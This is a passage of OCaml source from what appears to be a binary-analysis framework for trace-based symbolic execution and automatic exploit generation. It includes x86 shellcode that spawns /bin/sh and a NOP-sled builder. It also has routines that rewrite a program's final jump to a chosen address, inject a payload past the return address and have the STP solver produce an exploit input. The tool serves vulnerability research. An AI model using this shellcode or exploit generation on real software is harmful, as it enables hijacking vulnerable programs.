	(fun {index=index; taint=Taint taint} ->
	   let newvarname = "symb_" ^ (string_of_int taint) in
	   let sym_var = Var (Var.newvar newvarname reg_8) in
	     pdebug ("Introducing symbolic: " 
		     ^(Printf.sprintf "%Lx" index)
		     ^" -> "
		     ^(Pp.ast_exp_to_string sym_var));
	     add_symbolic index sym_var ;
	     (* symbolic variable *)
	     (* XXX + TODO + FIXME + HACK *)
	     let mem = Var(memv) in
	     let store = Store(mem, Int(index, reg_32), sym_var, exp_false, reg_8) in
	     let constr = BinOp (EQ, mem, store) in
	       ignore (LetBind.add_to_formula exp_true constr Rename)
				       
	) (filter_taint atts)
  | _ -> ()
	
let status = ref 0
let count = ref 0
	  
(** Get the vars used in a program *)
let allvars p =
  let h = VH.create 570 in
  let vis = object(self)
    inherit Ast_visitor.nop

    method visit_avar v =
      VH.replace h v ();
      `DoChildren

    method visit_rvar = self#visit_avar
  end 
  in
  ignore(Ast_visitor.prog_accept vis p);
  VH.fold (fun k () a -> k::a) h []	

let symbolic_run trace = 
  Status.init "Symbolic Run" (List.length trace) ;
  let h = VH.create 1000 in (* vars to dsa vars *)
  let rh = VH.create 10000 in (* dsa vars to vars *)
  dsa_rev_map := Some(rh);
  let trace = append_halt trace in
(*  VH.clear TaintSymbolic.dsa_map; *)
  cleanup ();
  let state = TraceSymbolic.build_default_context trace in
  (* Find the memory variable *)
  let memv =
    let vars = List.filter is_mem (allvars trace) in
    List.iter (fun x -> dprintf "memvar: %s" (Var.name x)) vars;
    assert ((List.length vars) = 1);
    List.hd vars
  in
  dprintf "Memory variable: %s" (Var.name memv);
  let to_dsa stmt = to_dsa_stmt stmt h rh in
  let formula = 
    try 
      let state = List.fold_left 
	(fun state stmt ->
	   let stmts = ref [] in
	   (* dprintf "Dsa'ified stmt: %s" (Pp.ast_stmt_to_string stmt); *)
	   Status.inc() ;
	   add_symbolic_seeds memv stmt;
	   let hasconc = update_concrete stmt in
	   if hasconc && !consistency_check then (
	     stmts := [(assert_vars h)]
	   );
	   if hasconc && !use_alt_assignment then (
	     let assigns = assign_vars () in
	     (* List.iter *)
	     (*   (fun stmt -> dprintf "assign stmt: %s" (Pp.ast_stmt_to_string stmt)) assigns; *)
	     stmts := !stmts @ assigns;
	   );
	   stmts := List.map to_dsa (!stmts @ [stmt]);
	   (*(if !status >= 3770 && !status <= 3771 then
	      (count := !count + 1;
	       (*print_endline (Pp.ast_stmt_to_string stmt) ;*)
	       (*TraceSymbolic.print_var state.delta "R_EAX" ;*)
	      let formula = TraceSymbolic.output_formula () in
		print_formula ("form_" ^ (string_of_int !count)) formula))
	     ;*)
	   dprintf "Evaluating stmt %s" (Pp.ast_stmt_to_string stmt);
	   (match stmt with
	      | Ast.Label (_,atts) when filter_taint atts != [] -> 
		  (* Printf.printf "%s\n" ("block no: " ^ (string_of_int !status)); *)
		  (* Printf.printf "%s\n" (Pp.ast_stmt_to_string stmt); *)
		  (* We have a new block *)
		  clean_delta state.delta;
		  get_indices();
		  status := !status + 1 ;
		  (*if !status > 3770 && !status < 3780 then 
		    let formula = TraceSymbolic.output_formula () in
		    print_formula ("form_" ^ (string_of_int !status)) formula*)
	      | _ -> ());
	   
	   (* Double fold since we may have to add an assertion *)
	   List.fold_left
	     (fun state stmt ->
		match TraceSymbolic.eval_stmt state stmt with
		| [next] -> next
		| _ -> failwith "Jump in a straightline program"
	     ) state !stmts
	) state trace
      in
	state.pred
    with 
      | Failure fail as e -> 
	  pdebug ("Symbolic Run Fail: "^fail);
	  (*state.pred*)
	  raise e
      | Halted (_,state) -> 
	  pdebug "Symbolic Run ... Successful!";
	  state.pred
      | AssertFailed _ as e ->
	  pdebug "Failed assertion ..." ;
	  (*state.pred*)
	  raise e
  in
  Status.stop () ;
  dsa_rev_map := None;  
  formula

let concolic trace =
  let trace,_ = to_dsa trace in
  let trace = concrete trace in
  ignore (symbolic_run trace) ;
  trace

(*************************************************************)
(********************  Exploit Generation  *******************)
(*************************************************************)

(* A simple shellcode *)
let shellcode =
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    ^ "\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

let nop = '\x90'

let nopsled n = String.make n nop

(* TODO: find a way to determine PIN's offset *)
let pin_offset = 400L

(* The last jump of the trace *)
let get_last_jmp_exp stmts = 
  let rev = List.rev stmts in
  let rec get_exp = function
    | [] -> failwith "no jump found"
    | (Ast.Jmp(e, atts))::rest ->
	((e,atts), rest)
    | _::rest -> get_exp rest
  in
  let (exp, rev) = get_exp rev in
    (exp, List.rev rev)

(* Substituting the last jump with assertions *)
let hijack_control target trace = 
  let ((e, atts), trace) = get_last_jmp_exp trace in
  let ret_constraint = BinOp(EQ,e,target) in
    trace, Ast.Assert(ret_constraint, atts)
      
(* Setting the return address to an arbitrary value *)
let control_flow addr trace = 
  let target = Int64.of_string ("0x"^addr) in
  let target = Int(target,reg_32) in
  let trace, assertion = hijack_control target trace in
    Util.fast_append trace [assertion]

(* Making the final jump target a symbolic variable. This
   should be useful for enumerating all possible jump targets *)  
let limited_control trace = 
  let target = Var (Var.newvar "symb_jump_target" reg_32) in
  let trace, assertion = hijack_control target trace in
    Util.fast_append trace [assertion]

(* Injecting a payload at an offset past the return address *)
let inject_payload start payload trace = 
  (* TODO: A simple dataflow is missing here *)
  let get_last_load_exp stmts = 
    let rev = List.rev stmts in
    let rec get_load = function
      | [] -> failwith "no load found"
      | (Ast.Move(_,Ast.Load(array,index,_,_),_))::rest ->
	  (array,index)
      | _::rest -> get_load rest
    in
      get_load rev
  in
  let _m, trace = get_last_jmp_exp trace in
  let mem, ind = get_last_load_exp trace in
   (* Let's convert to Int64 *)
  let payload = List.map Int64.of_int payload in
  let _,assertions = 
    List.fold_left 
      (fun (i,acc) value ->
	 let index = Ast.BinOp(PLUS, ind, Int(i,reg_32)) in
	 let load = Ast.Load(mem, index, exp_false, reg_8) in
	 let constr = Ast.BinOp(EQ, load, Int(value, reg_8)) in
	   (Int64.succ i, (Ast.Assert(constr, [])::acc))
      ) (start, []) payload
  in
    trace, List.rev assertions

(* Convert a string to a list of bytes *)
let string_to_bytes payload =
  let bytes = ref [] in
    String.iter 
      (fun c -> bytes := ((int_of_char c)::!bytes)) payload ;
    List.rev !bytes

(* Add an arbitrary payload after the return address *)
let add_payload payload trace = 
  let payload = string_to_bytes payload in
  let trace, assertions = inject_payload 0L payload trace in
    Util.fast_append trace assertions

(* Return a list of bytes read from a file *)
let bytes_from_file file =
  let cin = open_in file in
  let bytes = ref [] in
  let rec get_bytes () = 
    bytes := (input_byte cin)::!bytes ;
    get_bytes ()
  in
    try get_bytes () with End_of_file -> () ;
    close_in cin;
    List.rev !bytes

let add_payload_from_file file trace = 
  let payload = bytes_from_file file in
  let trace, assertions = inject_payload 0L payload trace in
    Util.fast_append trace assertions

(* Performing shellcode injection *)
let inject_shellcode nops trace = 
  let get_stack_address stmts = 
    let rec get_addr = function
      | [] -> failwith "could not get address"
      | (Ast.Label (_,atts))::rest ->
	  let conc = filter_taint atts in
	    if conc = [] then get_addr rest
	    else
	      List.fold_left 
		(fun addr {mem=mem;index=index} ->
		   if mem then index
		   else addr
		) 0L conc  (* FIX: fail by default *)
      | x::rest -> get_addr rest
    in
      get_addr (List.rev stmts)
  in	  
  let payload = (nopsled nops) ^ shellcode in
  let target_addr = get_stack_address trace in
  let target_addr = Int64.add target_addr pin_offset in
  let target_addr = Int(target_addr, reg_32) in
  let trace, assertion = hijack_control target_addr trace in
  let payload = string_to_bytes payload in
  let _, shell = inject_payload 4L payload trace in
    Util.fast_append trace (shell @ [assertion])


(*************************************************************)
(********************  Formula Generation  *******************)
(*************************************************************)

let generate_formula trace = 
  LetBind.bindings := [] ;  (*  XXX: temporary hack *)
  let trace = concrete trace in
  (*let trace,rh = to_dsa trace in*)
  (* Set the reverse lookup into place so dsa_lookup_var can map to original vars/names *)
  (*dsa_rev_map := Some(rh);*)
  ignore(symbolic_run trace) ;
  TraceSymbolic.output_formula ()

let output_formula file trace = 
  let formula = generate_formula trace in
    (*dprintf "formula size: %Ld\n" (formula_size formula) ;*)
    print "Printing out formula\n" ; flush stdout ;
    print_formula file formula ;
    print "Done printing out formula\n";
    trace

      
(*************************************************************)
(****************  Exploit String Generation  ****************)
(*************************************************************)

let formula_storage = ".formula"
let answer_storage = ".answer"

let solution_from_stp_formula file =
  let cin = open_in file in
  try
    let lexbuf = Lexing.from_channel cin in
    let solution = Stp_grammar.main Stp_lexer.token lexbuf in
    Lexing.flush_input lexbuf;
    close_in cin;
    solution
  with _ as e -> (* Make sure that we close oc if there is a parse exception *)
    close_in cin;
    raise e
      
let solve_formula input output =
  (* print "Querying STP for a satisfying answer\n" ;  *)
  flush stdout ;
  let cmd = "stp < " ^ input ^ " > " ^ output in
    match Unix.system cmd with
      | Unix.WEXITED 0 -> ()
      | _ -> failwith ("STP query failed, consider increasing"
			 ^ " the stack with ulimit")

let output_exploit file trace = 
  ignore (output_formula formula_storage trace) ;
  solve_formula formula_storage answer_storage ;
  let var_vals = solution_from_stp_formula answer_storage in
    (* The variables that we care about *)
  let is_input v = String.sub v 0 4 = "symb" in
    (* A special function to sort interesting variables by name *)
  let underscore = Str.regexp_string "_" in
  let split_var = Str.split underscore in
  let var_to_string_num var = List.nth (split_var var) 1 in
  let var_to_num var = int_of_string (var_to_string_num var) in
  let sort = 
    let sort_aux (var1, _) (var2,_) =
	compare (var_to_num var1) (var_to_num var2)
    in  
      List.sort sort_aux
  in
    (* Padding unused symbolic bytes *)
  let pad_unused =
    let rec pad n acc = function
      | [] -> List.rev acc
      | ((var,_) as first)::rest when var_to_num var = n ->
	  pad (n+1) (first::acc) rest
      | more ->
	  pad (n+1) (("",1L)::acc) more
    in
      pad 1 []
  in	  
  let symb_var_vals = List.filter (fun (v,_) -> is_input v) var_vals in
  let sorted = sort symb_var_vals in
  let padded = if !padding then pad_unused sorted else sorted in
  let _, input = List.split padded in
  let input = List.map Int64.to_int input in
    (* Let's output the exploit string *)
  let cout = open_out file in
    List.iter (output_byte cout) input ;
    close_out cout;
    print "Exploit string was written out to file \"%s\"\n" file ;
    flush stdout ;
    trace    



(*************************************************************)
(**************** Type Inference on Traces  ******************)
(*************************************************************)

open Var

let add_assignments trace = 
  let varset = Hashtbl.create 100 in
  let get_vars_from_stmt = 
    let var_visitor = object(self)
      inherit Ast_visitor.nop
      method visit_rvar v = 
	let name = Var.name v in
	  (try
	     let value = match concrete_val name with
	       | Some(x) -> x
	       | None -> failwith "Unhandled"
	     in
	     if not (Hashtbl.mem varset name) then
	       Hashtbl.add varset name (v,value)
	   with Not_found -> ());
	  `DoChildren
    end
    in
      Ast_visitor.stmt_accept var_visitor
  in
  List.iter 
    (fun s -> 
       ignore(update_concrete s) ;
       ignore (get_vars_from_stmt s)
    ) trace;
    let assignments = Hashtbl.fold
      (fun _ (var,value) acc ->
	 (Ast.Move (var, value, []))::acc 
      ) varset []
    in
      Util.fast_append assignments trace

(*************************************************************)
(******************* Formula Debugging  **********************)
(*************************************************************)

(* Binary search to check where things go wrong *)
let valid_to_invalid trace = 
  let length = List.length trace in
  let rec test l u =
    Printf.printf "Searching %d %d\n" l u ;
    if l >= u - 1 then (l,u)
    else 
      let middle = (l + u) / 2 in
      let trace = Util.take middle trace in
	try 
	  ignore (output_formula "temp" trace) ;
          ignore (solve_formula "temp" "tempout") ;
	  ignore(Unix.system("cat tempout"));
	  let _ = solution_from_stp_formula "tempout" in 
	  Printf.printf "going higher\n";
	  test middle u
	with Parsing.Parse_error ->
	  (Printf.printf "going lower\n";
	   test l middle)
	| Symbeval.UnknownLabel ->
	    (Printf.printf "going a little higher\n";
	     test l (u-1))
  in
  let (l,u) = test 1 length in
    ignore (output_formula "form_val" (Util.take l trace)) ;
    ignore (output_formula "form_inv" (Util.take u trace)) ;
    trace
      
module NameSet = Set.Make(String)

(* Wanna slice? *)
let slice varname trace = 
  let rev = List.rev trace in
  let maps = ref (NameSet.singleton varname) in
  let vis = object(self)
    inherit Ast_visitor.nop
    method visit_exp = function
      | Ast.Var v -> maps := NameSet.add (Var.name v) !maps ; `DoChildren 
      | _ -> `DoChildren
  end
  in
  let run_all acc = function 
    | Ast.Move(v, e, _) as s ->
	let name = Var.name v in
	  if NameSet.mem name !maps then
	    (
	      ignore( Ast_visitor.exp_accept vis e );
	      maps := NameSet.remove name !maps ;
	      s::acc
	    )
	  else acc
    | _ -> acc
  in
    List.fold_left run_all [] rev
		   
	    
